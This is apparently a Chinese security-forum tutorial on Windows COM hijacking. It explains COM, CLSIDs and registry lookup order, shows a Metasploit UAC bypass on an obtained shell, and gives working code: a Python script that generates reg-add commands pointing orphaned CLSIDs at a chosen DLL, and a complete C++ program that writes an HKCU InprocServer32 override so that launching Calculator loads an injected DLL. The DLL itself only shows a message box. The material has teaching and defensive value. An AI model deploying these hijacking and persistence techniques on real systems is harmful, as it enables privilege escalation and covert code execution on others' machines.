何为com
=====

COM是Component Object Model （组件对象模型）的缩写。

COM是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。

COM是开发[软件组件](https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6%E7%BB%84%E4%BB%B6)的一种方法。组件实际上是一些小的二进制可执行程序，它们可以给[应用程序](https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445)，操作系统以及其他组件提供服务。开发自定义的COM组件就如同开发动态的，[面向对象](https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1)的API。多个COM对象可以连接起来形成应用程序或组件系统。并且组件可以在运行时刻，在不被重新链接或编译应用程序的情况下被卸下或替换掉。Microsoft的许多技术，如ActiveX, DirectX以及OLE等都是基于COM而建立起来的。并且Microsoft的开发人员也大量使用COM组件来定制他们的应用程序及操作系统。

这里有一个问题，为什么要用com组件呢？

com组件主要是解决了代码共用以及版本问题、能够调用其他软件的功能、所有代码都能够面向对象

com与注册表的关系
==========

注册表大家都应该比较熟悉，他主要具有一些特殊的数据类型来存储一些数据满足应用程序的需要，主要有以下几个

> HKEY\_CLASSES\_ROOT 用于存储一些文档类型、类、类的关联属性
> 
> HKEY\_CURRENT\_CONFIG 用户存储有关本地计算机系统的当前硬件配置文件信息
> 
> HKEY\_CURRENT\_USER 用于存储当前用户配置项
> 
> HKEY\_CURRENT\_USER\_LOCAL\_SETTINGS 用于存储当前用户对计算机的配置项
> 
> HKEY\_LOCAL\_MACHINE 用于存储当前用户物理状态
> 
> HKEY\_USERS 用于存储新用户的默认配置项

**CLSID**

class identifier（类标识符）也称为CLASSID或CLSID，是与某一个类对象相联系的唯一标记(UUID)。一个准备创建多个对象的类对象应将其CLSID注册到系统注册数据库的任务表中，以使客户能够定位并装载与该对象有关的可执行代码。

当初微软设计com规范的时候，有两种选择来保证用户的设计的com组件可以全球唯一：

第一种是采用和Internet地址一样的管理方式，成立一个管理机构，用户如果想开发一个COM组件的时候需要向该机构提出申请，并交一定的费用。

第二种是发明一种算法，每次都能产生一个全球唯一的COM组件标识符。

第一种方法，用户使用起来太不方便，微软采用第二种方法，并发明了一种算法，这种算法用GUID（Globally Unique Identifiers）来标识COM组件，GUID是一个128位长的数字，一般用16进制表示。算法的核心思想是结合机器的网卡、当地时间、一个随即数来生成GUID。从理论上讲，如果一台机器每秒产生10000000个GUID，则可以保证（概率意义上）3240年不重复。

也就是说CLSID就是对象的身份证号，而当一个应用程序想要调用某个对象时，也是通过CLSID来寻找对象的。比如我的电脑的CLSID就为`{20D04FE0-3AEA-1069-A2D8-08002B30309D}`，控制面板的CLSID就为`{21EC2020-3AEA-1069-A2DD-08002B30309D}`

CLSID的路径位于`HKEY_CLASSES_ROOT\CLSID`

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d11cd9bf6a0a3ea2dd09449d8eb8e4502fd8f809.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d11cd9bf6a0a3ea2dd09449d8eb8e4502fd8f809.png)

CLSID其实是一个结构体，结构如下

```c++
typedef struct _GUID {
    DWORD Data1; // 随机数 
    WORD Data2; // 和时间相关
    WORD Data3; // 和时间相关
    BYTE Data4[8]; // 和网卡MAC相关
    } GUID;
    typedef GUID CLSID;  // 组件ID
    typedef GUID IID;    // 接口ID
```

com劫持
=====

前面说了这么多的基础知识来到今天的正文，首先要了解com组件的加载过程，com组件会根据以下路径去寻找

> HKCU\\Software\\Classes\\CLSID
> 
> HKCR\\CLSID
> 
> HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\shellCompatibility\\Objects\\

那么我们如果想要进行com劫持，肯定挑选的是首先寻找的路径，即`HKCU\Software\Classes\CLSID`，我们可以直接在CLSID下新建一个对象ID，与dll劫持不同的是，dll劫持只能劫持dll，局限性比较大，但是com组件能够劫持如.com文件、pe文件、api文件等等

COM对象是注册表中对磁盘上没有实现文件的对象的引用。例如，在注册表项HKCU \\ CLSID \\ {xxxx} \\ InprocServer32 \\ Default下，其中{xxxx}是COM对象的相应GUID，您应该找到对文件yyy.dll的引用。如果磁盘上不存在此文件或缺少“（默认）”条目，则请求访问此对象的进程将失败。

那么这可以衍生出两种思路，第一种思路就是寻找被“遗弃“的com键进行劫持，那么何为被"遗弃"的com键呢？

在一些程序卸载后，注册表内的com键会被遗留下来，即处于为注册的状态，这个com键会指向一个路径里面的dll，但是因为这个程序已经被卸载了，所以肯定是找不到这个dll的，那么这里我们就可以修改这个com键指向的路径来完成我们自己dll的加载0

第二种思路就是覆盖COM对象，在`HKCU`注册表中添加正确的键值后，当引用目标COM对象时，`HKLM`中的键值就会被覆盖（并且“添加”到`HKCR`中）。

实现com劫持
=======

之前在实战的过程中在msf上拿到了user权限的shell，但是直接getsystem不能够提到系统权限，用到了`bypassuac`之后得到了系统权限的dll，那么这里首先看一下msf是怎么实现com劫持bypassuac的

首先拿到一个shell直接getsystem提权失败

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-2c63ee1fdd2fde42aac2e0c8de1007972be31c0c.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-2c63ee1fdd2fde42aac2e0c8de1007972be31c0c.png)

然后使用com组件bypassuac

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ea23ca78661be472513ee80684694878854d7e59.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ea23ca78661be472513ee80684694878854d7e59.png)

首先我把uac调到最高

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e7f135954f8bea01756c0bfe60a84b6d51ecd426.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e7f135954f8bea01756c0bfe60a84b6d51ecd426.png)

发现这里报错，因为`UAC is set to Always Notify`，也就是说最高级的uac好像绕不过

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c1eebcf4c973eaaee3e551ea51eee30f355c038b.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c1eebcf4c973eaaee3e551ea51eee30f355c038b.png)

然后我把uac调整到默认级别

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c7b1c445a799c0b1e36d2b501a8c4b86c3689189.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c7b1c445a799c0b1e36d2b501a8c4b86c3689189.png)

发现msf劫持的是`HKCU\Software\classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}`，dll的位置在`C:\Users\messi \AppData\Local\Temp\LlvIwfwd.dll`

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e308bbc2604d71c3a57dd6e62465a53560d01a5e.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e308bbc2604d71c3a57dd6e62465a53560d01a5e.png)

那么思路就清晰了，我们就需要修改注册表，然后让注册表的路径指向我们存放dll的路径即可

利用缺失的CLSID
----------

这里我选择的是对计算器进行com劫持，首先找一下缺少的CLSID并在`InprocServer32`下

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-083d60f2e1f30dfde1908fae6dad4233f0189655.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-083d60f2e1f30dfde1908fae6dad4233f0189655.png)

找到了几个能够劫持的com组件

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ba6817338dcadc090432b4426e97c1acc0281566.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ba6817338dcadc090432b4426e97c1acc0281566.png)

保存并导出为`Logfile.CSV`

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-14181bb9a900e88e88112c74c71c808f40b2c660.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-14181bb9a900e88e88112c74c71c808f40b2c660.png)

然后写一个py脚本，批量循环添加注册表指向dll路径并生成一个`com_hijack.bat`

```c++
reg add [PATH] /ve /t REG_SZ /d C:\\Users\\Administrator\\testdll.dll /f
```

完整代码如下

```c++
import csv

class Inject(object):
    def __init__(self):
        self.path='Logfile.CSV'

    def add(self):
        with open(self.path,'r',encoding='utf-8') as r:
            g=csv.DictReader(r)
            for name in g:
                z=[x for x in name]
                for i in z:
                    if 'HK' in str(name[i]):
                        print('reg add {} /ve /t REG_SZ /d C:\\Users\\Administrator\\Desktop\\testdll.dll /f'.format(name[i]),file=open('com_hijack.bat','a',encoding='utf-8'))

if __name__ == '__main__':
    obj=Inject()
    obj.add()
    print('[!] Administrator run com_hijack.bat')
```

执行py

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-f5898f30fe52afe9cc438473eba7db6a506cd90b.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-f5898f30fe52afe9cc438473eba7db6a506cd90b.png)

即在目录下生成一个`com_hijack.bat`，使用管理员权限运行

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-207ea7effe3ff13c659c0f172bad20f3fcda870f.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-207ea7effe3ff13c659c0f172bad20f3fcda870f.png)

设置过滤条件发现已经成功劫持

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-3f0974aa99764c57233b1569266de9d897c7fef5.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-3f0974aa99764c57233b1569266de9d897c7fef5.png)

覆盖存在的CLSID
----------

这里覆盖存在的CLSID就需要尽可能挑选应用范围广的，这里选择计算器进行劫持，对应的CLSID为`{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}`，这个CLSID可以实现对`CAccPropServicesClass`和`MMDeviceEnumerator`实例的劫持

进行注册表的创建用到的api为`RegCreateKeyExA`，结构如下

```c++
LONG RegCreateKeyEx(
  HKEY hKey,                                  // handle to open key
  LPCTSTR lpSubKey,                           // subkey name
  DWORD Reserved,                             // reserved
  LPTSTR lpClass,                             // class string
  DWORD dwOptions,                            // special options
  REGSAM samDesired,                          // desired security access
  LPSECURITY_ATTRIBUTES lpSecurityAttributes, // inheritance
  PHKEY phkResult,                            // key handle 
  LPDWORD lpdwDisposition                     // disposition value buffer
);
```

> hkey：注册表的句柄
> 
> lpSubKey：此函数打开或创建的子项的名称，不能为NULL
> 
> Reserved：保留参数，必须为0
> 
> lpClass：该键的用户定义类类型。可以忽略此参数。此参数可以为**NULL**
> 
> dwOptions：有几个参数，这里就不写了
> 
> samDesired：指定要创建的密钥的访问权限的掩码
> 
> lpSecurityAttributes：指向[SECURITY\_ATTRIBUTES](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85))结构的指针
> 
> phkResult：指向接收打开或创建的键的句柄的变量的指针
> 
> lpdwDisposition：指向接收处置值之一的变量的指针
> 
> 函数执行成功则返回ERROR\_SUCCESS，函数执行失败则为非零错误代码

修改注册表的属性用到的api为`RegSetValueExA`

```c++
LSTATUS RegSetValueExW(
  HKEY       hKey,
  LPCWSTR    lpValueName,
  DWORD      Reserved,
  DWORD      dwType,
  const BYTE *lpData,
  DWORD      cbData
);
```

> hkey：注册表的句柄
> 
> lpValueName：要设置的值的名称
> 
> Reserved：保留值，必须为0
> 
> dwType：*lpData*参数指向的数据类型
> 
> lpData：要存储的数据
> 
> cbData：*lpData*参数指向的信息的大小，以字节为单位
> 
> 函数执行成功则返回 ERROR\_SUCCESS，函数执行失败则返回非零错误代码

那么首先使用`RegCreateKeyExA`创建注册表

```c++
RegCreateKeyExA(HKEY_CURRENT_USER,
            "Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32",
            0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
```

再用`RegCreateKeyExA`设置DLL文件的属性

```c++
RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)system1, (1 + ::lstrlenA(system1)))
```

然后再设置`InprocServer32`下的`ThreadingModel`属性，这里我们随便打开一个`CLSID`里面的`InprocServer32`文件夹，发现都是由一个dll文件的路径 + 一个`ThreadingModel`组成的，这个`ThreadingModel`键值是用来标记dll的线程模型，它代表容纳此COM 类的载体应当是一个动态链接库，对应的值就为`Apartment`

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c451249d788c6be31603c241f8af5ffeb26021af.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c451249d788c6be31603c241f8af5ffeb26021af.png)

那我们定义一个数组，再修改`ThreadingModel`的值即可完成`InprocServer32`属性的修改

```c++
char system2[] = "Apartment";

RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)system2, (1 + ::lstrlenA(system2)))
```

对应的，我们进行com劫持完成之后，也需要写一个卸载的代码，这里就不细说了直接贴上来，跟前面的思路差不多，使用到`RegDeleteValueA`删除注册表属性即可，代码如下

```c++
RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition)

RegDeleteValueA(hKey, NULL)

RegDeleteValueA(hKey, "ThreadingModel")
```

完整代码如下

```c++
// COMInject.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h> 
#include <string>
using namespace std;

BOOL COMInject()
{
    HKEY hKey;
    DWORD dwDisposition;
    char system1[] = "C:\\Users\\administrator\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\comInject.dll";
    char system2[] = "Apartment";
    string defaultPath = "C:\\Users\\administrator\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}";
    string szSaveName = "C:\\Users\\administrator\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\comInject.dll";
    {

        if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
            "Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32",
            0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
        {
            printf("创建注册表失败！");
            return 0;
        }

        if (ERROR_SUCCESS != RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)system1, (1 + ::lstrlenA(system1))))
        {
            printf("设置DLL文件失败！");
            return 0;
        }

        if (ERROR_SUCCESS != RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)system2, (1 + ::lstrlenA(system2))))
        {
            printf("设置ThreadingModel失败！");
            return 0;
        }

    ::MessageBoxA(NULL, "comInject OK", "", MB_OK);
    }
}

BOOL UnCOMInject()
{
    HKEY hKey;
    DWORD dwDisposition;

    string defaultPath = "C:\\Users\\administrator\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}";
    string szSaveName = "C:\\Users\\messi\\AppData\\Roaming\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\comInject.dll";

    if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
    {
        printf("创建注册表失败！");
        return 0;
    }

    if (ERROR_SUCCESS != RegDeleteValueA(hKey, NULL))
    {
        printf("移除DLL文件失败！");
        return 0;
    }

    if (ERROR_SUCCESS != RegDeleteValueA(hKey, "ThreadingModel"))
    {
        printf("移除ThreadingModel失败！");
        return 0;
    }

    remove(szSaveName.c_str());
    remove(defaultPath.c_str());

    ::MessageBoxA(NULL, "Delete comInject OK", "", MB_OK);
}
int main(int argc, char* argv[])
{
    COMInject();

    //UnCOMInject();

    return 0;
}
```

这里就生成一个最简单的弹窗吧，dll代码如下：

```c++
// dllmain.cpp : 定义 DLL 应用程序的入口点。
# include "pch.h"
# include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(0, "comInject OK", "", 0);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

首先以管理员权限执行`COMInject.exe`

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-2c186adfccb6ded08c1597c0e8b149b23e70ea7f.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-2c186adfccb6ded08c1597c0e8b149b23e70ea7f.png)

然后进入`C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Installer`路径发现创建了`{BCDE0395-E52F-467C-8E3D-C4579291692E}`这个文件夹

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-904d897f1adbde129680b4b3ff7a810e2a60656f.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-904d897f1adbde129680b4b3ff7a810e2a60656f.png)

再进入文件夹发现有`comInject.dll`

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-166405f9d2177a084245c3eab2d630183f781993.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-166405f9d2177a084245c3eab2d630183f781993.png)

再去注册表里面看一下

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-0986cb7c3789e55005d493687898e595dad99075.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-0986cb7c3789e55005d493687898e595dad99075.png)

发现已经改成了dll存放的路径

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-3eac362ae13a3118cc1e6b061f56f95a742d54a5.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-3eac362ae13a3118cc1e6b061f56f95a742d54a5.png)

打开计算器即可实现com劫持

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-8473bcbf95a7c22be1ee1369c5965d47480ae841.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-8473bcbf95a7c22be1ee1369c5965d47480ae841.png)